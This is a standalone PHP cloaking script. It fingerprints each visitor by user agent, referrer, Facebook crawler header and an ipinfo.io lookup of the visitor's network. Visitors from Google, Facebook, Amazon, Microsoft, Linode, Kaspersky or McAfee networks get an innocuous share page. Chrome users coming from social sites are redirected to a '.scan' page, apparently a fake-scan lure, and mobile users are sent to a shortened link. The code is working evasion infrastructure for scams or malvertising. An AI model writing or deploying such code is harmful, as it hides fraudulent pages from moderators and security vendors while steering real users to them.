<?php
  header("Access-Control-Allow-Origin:http://".$_SERVER["HTTP_HOST"]);
  header('Access-Control-Allow-Methods: GET');
  header('X-Frame-Options: DENY');

  function generate_name($length){
      $rname = '';
      $sesli = 'aeiou';
      $sessiz = 'bcdfghjklmnprstvyz';
      $rname = rand(1,2) == 1?$sessiz[rand(0,strlen($sessiz)-1)]:$sesli[rand(0,strlen($sesli)-1)];
      for($n=0;$n<$length;$n++){
          if(in_array($rname[strlen($rname)-1], str_split($sesli))){
              $rname .= $sessiz[rand(0,strlen($sessiz)-1)];
          }else{
              $rname .= $sesli[rand(0,strlen($sesli)-1)];
          }
      }
      return $rname;
  }

  function getORG(){
  	$ch = curl_init();
  	curl_setopt($ch, CURLOPT_URL, 'http://ipinfo.io/'.$_SERVER["REMOTE_ADDR"].'/org');
  	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  	curl_setopt($ch, CURLOPT_TIMEOUT, 5);
  	$org = curl_exec($ch);
  	curl_close($ch);
  	return $org;
  }

  function getSite(){
    $ch = curl_init();
  	curl_setopt($ch, CURLOPT_URL, 'http://blogger.report/php/site.php');
  	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  	$site = curl_exec($ch);
  	curl_close($ch);
  	return $site;
  }
  
  $action = 'theme';

  require_once('Mobile_Detect.php');
  require_once('Browser.php');
  $detect = new Mobile_Detect;
  $browser = new Browser();

  if($detect->isMobile() || $browser->isMobile()){
    $action = 'mobile';
  }else if($browser->getBrowser() == Browser::BROWSER_GOOGLEBOT) {
    $action = 'theme';
  }else if($browser->getPlatform() == Browser::PLATFORM_X11 || $browser->isFacebook()){
    $action = 'theme';
  }else if($browser->getBrowser() == Browser::BROWSER_CHROME){
    $action = 'site';
  }

  $_SERVER["HTTP_USER_AGENT"] = isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : "";

  if(strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false){
    $action = 'theme';
  }

  if($action == 'site'){
    $_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    $refs = array('facebook.com', 'uye.io', 'googleapis.com', 'blogspot.', 't.co', 'googleusercontent.com', 'herokuapp.com');
    $action = 'theme';
    foreach ($refs as $ref) {
      if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
        $action = 'site';
        break;
      }
    }
  }

  if($action == 'site'){
    $asnlist = array('facebook','google','linode','kaspersy','mcafee','amazon','microsoft corporation');
  }else if($action == 'mobile'){
    $asnlist = array('facebook','linode','kaspersy','mcafee','amazon','microsoft corporation');
  }

  if($action != 'theme'){
    $org = getORG();
    foreach ($asnlist as $asn) {
      if(strpos(strtolower($org), $asn) !== false){
        $action = 'theme';
        break;
      }
    }
  }

  if($action != 'theme'){
    $_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    $bannedrefs = array('facebook.com/lsr.php');
    foreach ($bannedrefs as $ref) {
      if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
        $action = 'theme';
        break;
      }
    }
  }

  if(isset($_SERVER['HTTP_X_FB_CURL_CLIENT'])){
    $action = 'theme';
  }

  if(isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] != 'GET'){
    $action = 'theme';
  }

  $id = @$_SERVER["REQUEST_URI"];
  if(empty($id) || $id == "" || $id == "/"){
    $id = generate_name(rand(5,10));
  }
  $id = isset(explode("/", $id)[1]) ? explode("/", $id)[1] : $id;
  $id = isset(explode(".", $id)[0]) ? explode(".", $id)[0] : $id;

  if($action == 'mobile'){
    header('Location: https://goo.gl/091aJP?'.rand(11111,99999));
  }else if($action == 'site'){
    header("Location: http://$_SERVER[HTTP_HOST]/$id.scan");
  }else{
    @ob_end_clean();
    @ob_end_flush();
    //header("HTTP/1.1 301");
    require_once('share.php');
  }
?>
